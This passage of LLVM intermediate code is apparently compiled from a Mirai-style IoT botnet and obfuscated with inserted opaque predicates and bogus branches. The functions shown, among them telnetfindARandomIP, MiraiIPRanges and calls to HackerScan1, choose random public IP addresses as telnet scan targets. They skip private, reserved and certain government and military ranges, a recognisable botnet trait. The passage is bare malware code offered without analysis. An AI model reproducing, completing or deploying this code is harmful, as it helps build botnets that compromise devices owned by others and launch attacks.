  %1 = alloca i32, align 4
  %2 = load i32, i32* @telnettestrange, align 4
  %3 = icmp slt i32 %2, 1
  br i1 %3, label %7, label %4

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @telnettestrange, align 4
  %6 = icmp sgt i32 %5, 2
  br i1 %6, label %7, label %9

; <label>:7:                                      ; preds = %4, %0
  %8 = call i32 @getRandomPublicIP()
  store i32 %8, i32* %1, align 4
  br label %21

; <label>:9:                                      ; preds = %4
  %10 = load i32, i32* @telnettestrange, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %14

; <label>:12:                                     ; preds = %9
  %13 = call i32 @getRandomPublicIP()
  store i32 %13, i32* %1, align 4
  br label %21

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* @telnettestrange, align 4
  %16 = icmp eq i32 %15, 2
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %14
  %18 = call i32 @HackerScan1()
  store i32 %18, i32* %1, align 4
  br label %21

; <label>:19:                                     ; preds = %14
  %20 = call i32 @HackerScan1()
  store i32 %20, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %19, %17, %12, %7
  %22 = load i32, i32* %1, align 4
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define i32 @telnetfindARandomIP() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @telnetrange, align 4
  %3 = icmp slt i32 %2, 1
  br i1 %3, label %7, label %4

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @telnetrange, align 4
  %6 = icmp sgt i32 %5, 2
  br i1 %6, label %7, label %9

; <label>:7:                                      ; preds = %4, %0
  %8 = call i32 @getRandomPublicIP()
  store i32 %8, i32* %1, align 4
  br label %37

; <label>:9:                                      ; preds = %4
  %10 = load i32, i32* @telnetrange, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %14

; <label>:12:                                     ; preds = %9
  %13 = call i32 @getRandomPublicIP()
  store i32 %13, i32* %1, align 4
  br label %37

; <label>:14:                                     ; preds = %9
  %15 = load i32, i32* @telnetrange, align 4
  %16 = icmp eq i32 %15, 2
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %14
  %18 = load i32, i32* @x.69
  %19 = load i32, i32* @y.70
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = call i32 @HackerScan1()
  store i32 %26, i32* %1, align 4
  %27 = load i32, i32* @x.69
  %28 = load i32, i32* @y.70
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:35:                                     ; preds = %14
  %36 = call i32 @HackerScan1()
  store i32 %36, i32* %1, align 4
  br label %37

; <label>:37:                                     ; preds = %35, %originalBBpart2, %12, %7
  %38 = load i32, i32* %1, align 4
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %17
  %39 = call i32 @HackerScan1()
  store i32 %39, i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @miraitestfindARandomIP() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @miraitestrange, align 4
  %3 = icmp slt i32 %2, 1
  br i1 %3, label %7, label %4

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @miraitestrange, align 4
  %6 = icmp sgt i32 %5, 2
  br i1 %6, label %7, label %25

; <label>:7:                                      ; preds = %4, %0
  %8 = load i32, i32* @x.71
  %9 = load i32, i32* @y.72
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = call i32 @getRandomPublicIP()
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* @x.71
  %18 = load i32, i32* @y.72
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %117

; <label>:25:                                     ; preds = %4
  %26 = load i32, i32* @x.71
  %27 = load i32, i32* @y.72
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* @miraitestrange, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.71
  %37 = load i32, i32* @y.72
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %62

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* @x.71
  %46 = load i32, i32* @y.72
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = call i32 @MiraiIPRanges()
  store i32 %53, i32* %1, align 4
  %54 = load i32, i32* @x.71
  %55 = load i32, i32* @y.72
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %117

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.71
  %64 = load i32, i32* @y.72
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %62
  %71 = load i32, i32* @miraitestrange, align 4
  %72 = icmp eq i32 %71, 2
  %73 = load i32, i32* @x.71
  %74 = load i32, i32* @y.72
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %72, label %81, label %99

; <label>:81:                                     ; preds = %originalBBpart212
  %82 = load i32, i32* @x.71
  %83 = load i32, i32* @y.72
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %81
  %90 = call i32 @HackerScan1()
  store i32 %90, i32* %1, align 4
  %91 = load i32, i32* @x.71
  %92 = load i32, i32* @y.72
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %117

; <label>:99:                                     ; preds = %originalBBpart212
  %100 = load i32, i32* @x.71
  %101 = load i32, i32* @y.72
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %99
  %108 = call i32 @MiraiIPRanges()
  store i32 %108, i32* %1, align 4
  %109 = load i32, i32* @x.71
  %110 = load i32, i32* @y.72
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %117

; <label>:117:                                    ; preds = %originalBBpart220, %originalBBpart216, %originalBBpart28, %originalBBpart2
  %118 = load i32, i32* %1, align 4
  ret i32 %118

originalBBalteredBB:                              ; preds = %originalBB, %7
  %119 = call i32 @getRandomPublicIP()
  store i32 %119, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %120 = load i32, i32* @miraitestrange, align 4
  %121 = icmp eq i32 %120, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %122 = call i32 @MiraiIPRanges()
  store i32 %122, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %62
  %123 = load i32, i32* @miraitestrange, align 4
  %124 = icmp eq i32 %123, 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %81
  %125 = call i32 @HackerScan1()
  store i32 %125, i32* %1, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %99
  %126 = call i32 @MiraiIPRanges()
  store i32 %126, i32* %1, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @MiraiIPRanges() #0 {
  %1 = load i32, i32* @x.73
  %2 = load i32, i32* @y.74
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca [16 x i8], align 16
  %15 = load i32, i32* @x.73
  %16 = load i32, i32* @y.74
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %23

; <label>:23:                                     ; preds = %386, %originalBBpart2
  %24 = load i32, i32* @x.73
  %25 = load i32, i32* @y.74
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = call i32 @rand_cmwc()
  store i32 %32, i32* %9, align 4
  %33 = load i32, i32* %9, align 4
  %34 = and i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %10, align 1
  %36 = load i32, i32* %9, align 4
  %37 = lshr i32 %36, 8
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  store i8 %39, i8* %11, align 1
  %40 = load i32, i32* %9, align 4
  %41 = lshr i32 %40, 16
  %42 = and i32 %41, 255
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %12, align 1
  %44 = load i32, i32* %9, align 4
  %45 = lshr i32 %44, 24
  %46 = and i32 %45, 255
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %13, align 1
  %48 = load i32, i32* @x.73
  %49 = load i32, i32* @y.74
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart247, label %originalBB1alteredBB

originalBBpart247:                                ; preds = %originalBB1
  br label %56

; <label>:56:                                     ; preds = %originalBBpart247
  %57 = load i8, i8* %10, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 127
  br i1 %59, label %386, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %386, label %64

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* @x.73
  %66 = load i32, i32* @y.74
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %64
  %73 = load i8, i8* %10, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 3
  %76 = load i32, i32* @x.73
  %77 = load i32, i32* @y.74
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %75, label %386, label %84

; <label>:84:                                     ; preds = %originalBBpart251
  %85 = load i8, i8* %10, align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 15
  br i1 %87, label %386, label %88

; <label>:88:                                     ; preds = %84
  %89 = load i8, i8* %10, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 16
  br i1 %91, label %386, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i8, i8* %10, align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 56
  br i1 %95, label %386, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i8, i8* %10, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 10
  br i1 %99, label %386, label %100

; <label>:100:                                    ; preds = %96
  %101 = load i8, i8* %10, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 192
  br i1 %103, label %104, label %124

; <label>:104:                                    ; preds = %100
  %105 = load i32, i32* @x.73
  %106 = load i32, i32* @y.74
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %104
  %113 = load i8, i8* %11, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 168
  %116 = load i32, i32* @x.73
  %117 = load i32, i32* @y.74
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %115, label %386, label %124

; <label>:124:                                    ; preds = %originalBBpart255, %100
  %125 = load i8, i8* %10, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 172
  br i1 %127, label %128, label %168

; <label>:128:                                    ; preds = %124
  %129 = load i32, i32* @x.73
  %130 = load i32, i32* @y.74
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %128
  %137 = load i8, i8* %11, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sge i32 %138, 16
  %140 = load i32, i32* @x.73
  %141 = load i32, i32* @y.74
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %139, label %148, label %168

; <label>:148:                                    ; preds = %originalBBpart259
  %149 = load i32, i32* @x.73
  %150 = load i32, i32* @y.74
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %148
  %157 = load i8, i8* %11, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %158, 32
  %160 = load i32, i32* @x.73
  %161 = load i32, i32* @y.74
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %159, label %386, label %168

; <label>:168:                                    ; preds = %originalBBpart263, %originalBBpart259, %124
  %169 = load i32, i32* @x.73
  %170 = load i32, i32* @y.74
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %168
  %177 = load i8, i8* %10, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 100
  %180 = load i32, i32* @x.73
  %181 = load i32, i32* @y.74
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %179, label %188, label %228

; <label>:188:                                    ; preds = %originalBBpart267
  %189 = load i32, i32* @x.73
  %190 = load i32, i32* @y.74
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %188
  %197 = load i8, i8* %11, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp sge i32 %198, 64
  %200 = load i32, i32* @x.73
  %201 = load i32, i32* @y.74
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %199, label %208, label %228

; <label>:208:                                    ; preds = %originalBBpart271
  %209 = load i32, i32* @x.73
  %210 = load i32, i32* @y.74
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %208
  %217 = load i8, i8* %11, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp slt i32 %218, 127
  %220 = load i32, i32* @x.73
  %221 = load i32, i32* @y.74
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br i1 %219, label %386, label %228

; <label>:228:                                    ; preds = %originalBBpart275, %originalBBpart271, %originalBBpart267
  %229 = load i32, i32* @x.73
  %230 = load i32, i32* @y.74
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %228
  %237 = load i8, i8* %10, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 169
  %240 = load i32, i32* @x.73
  %241 = load i32, i32* @y.74
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br i1 %239, label %248, label %252

; <label>:248:                                    ; preds = %originalBBpart279
  %249 = load i8, i8* %11, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp sgt i32 %250, 254
  br i1 %251, label %386, label %252

; <label>:252:                                    ; preds = %248, %originalBBpart279
  %253 = load i8, i8* %10, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 198
  br i1 %255, label %256, label %296

; <label>:256:                                    ; preds = %252
  %257 = load i32, i32* @x.73
  %258 = load i32, i32* @y.74
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %256
  %265 = load i8, i8* %11, align 1
  %266 = zext i8 %265 to i32
  %267 = icmp sge i32 %266, 18
  %268 = load i32, i32* @x.73
  %269 = load i32, i32* @y.74
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %267, label %276, label %296

; <label>:276:                                    ; preds = %originalBBpart283
  %277 = load i32, i32* @x.73
  %278 = load i32, i32* @y.74
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %276
  %285 = load i8, i8* %11, align 1
  %286 = zext i8 %285 to i32
  %287 = icmp slt i32 %286, 20
  %288 = load i32, i32* @x.73
  %289 = load i32, i32* @y.74
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %287, label %386, label %296

; <label>:296:                                    ; preds = %originalBBpart287, %originalBBpart283, %252
  %297 = load i8, i8* %10, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp sge i32 %298, 224
  br i1 %299, label %386, label %300

; <label>:300:                                    ; preds = %296
  %301 = load i8, i8* %10, align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 6
  br i1 %303, label %384, label %304

; <label>:304:                                    ; preds = %300
  %305 = load i8, i8* %10, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 7
  br i1 %307, label %384, label %308

; <label>:308:                                    ; preds = %304
  %309 = load i8, i8* %10, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 11
  br i1 %311, label %384, label %312

; <label>:312:                                    ; preds = %308
  %313 = load i8, i8* %10, align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 21
  br i1 %315, label %384, label %316

; <label>:316:                                    ; preds = %312
  %317 = load i8, i8* %10, align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 22
  br i1 %319, label %384, label %320

; <label>:320:                                    ; preds = %316
  %321 = load i8, i8* %10, align 1
  %322 = zext i8 %321 to i32
  %323 = icmp eq i32 %322, 26
  br i1 %323, label %384, label %324

; <label>:324:                                    ; preds = %320
  %325 = load i8, i8* %10, align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 28
  br i1 %327, label %384, label %328

; <label>:328:                                    ; preds = %324
  %329 = load i32, i32* @x.73
  %330 = load i32, i32* @y.74
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %328
  %337 = load i8, i8* %10, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 29
  %340 = load i32, i32* @x.73
  %341 = load i32, i32* @y.74
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %339, label %384, label %348

; <label>:348:                                    ; preds = %originalBBpart291
  %349 = load i8, i8* %10, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 30
  br i1 %351, label %384, label %352

; <label>:352:                                    ; preds = %348
  %353 = load i8, i8* %10, align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 33
  br i1 %355, label %384, label %356

; <label>:356:                                    ; preds = %352
  %357 = load i32, i32* @x.73
  %358 = load i32, i32* @y.74
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %356
  %365 = load i8, i8* %10, align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 55
  %368 = load i32, i32* @x.73
  %369 = load i32, i32* @y.74
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %367, label %384, label %376

; <label>:376:                                    ; preds = %originalBBpart295
  %377 = load i8, i8* %10, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 214
  br i1 %379, label %384, label %380

; <label>:380:                                    ; preds = %376
  %381 = load i8, i8* %10, align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 215
  br label %384

; <label>:384:                                    ; preds = %380, %376, %originalBBpart295, %352, %348, %originalBBpart291, %324, %320, %316, %312, %308, %304, %300
  %385 = phi i1 [ true, %376 ], [ true, %originalBBpart295 ], [ true, %352 ], [ true, %348 ], [ true, %originalBBpart291 ], [ true, %324 ], [ true, %320 ], [ true, %316 ], [ true, %312 ], [ true, %308 ], [ true, %304 ], [ true, %300 ], [ %383, %380 ]
  br label %386

; <label>:386:                                    ; preds = %384, %296, %originalBBpart287, %248, %originalBBpart275, %originalBBpart263, %originalBBpart255, %96, %92, %88, %84, %originalBBpart251, %60, %56
  %387 = phi i1 [ true, %296 ], [ true, %originalBBpart287 ], [ true, %248 ], [ true, %originalBBpart275 ], [ true, %originalBBpart263 ], [ true, %originalBBpart255 ], [ true, %96 ], [ true, %92 ], [ true, %88 ], [ true, %84 ], [ true, %originalBBpart251 ], [ true, %60 ], [ true, %56 ], [ %385, %384 ]
  br i1 %387, label %23, label %388

; <label>:388:                                    ; preds = %386
  %389 = getelementptr inbounds [16 x i8], [16 x i8]* %14, i32 0, i32 0
  %390 = load i8, i8* %10, align 1
  %391 = zext i8 %390 to i32
  %392 = load i8, i8* %11, align 1
  %393 = zext i8 %392 to i32
  %394 = load i8, i8* %12, align 1
  %395 = zext i8 %394 to i32
  %396 = load i8, i8* %13, align 1
  %397 = zext i8 %396 to i32
  %398 = call i32 (i8*, i8*, ...) @szprintf(i8* %389, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.488, i32 0, i32 0), i32 %391, i32 %393, i32 %395, i32 %397)
  %399 = load i8, i8* %10, align 1
